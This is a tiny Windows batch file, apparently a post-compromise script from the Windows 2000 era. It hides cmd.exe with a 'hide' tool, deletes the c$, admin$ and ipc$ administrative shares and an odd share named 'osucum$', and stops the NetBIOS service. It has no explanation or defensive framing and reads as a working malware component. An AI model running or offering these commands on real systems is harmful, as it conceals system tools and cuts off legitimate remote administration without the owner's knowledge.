@echo off
hide /hide "C:\WINNT\System32\cmd.exe"
net share c$ /delete /yes
net share admin$ /delete /yes
net share ipc$ /delete /yes
net share osucum$ /delete /yes
net stop netbios /yes
exit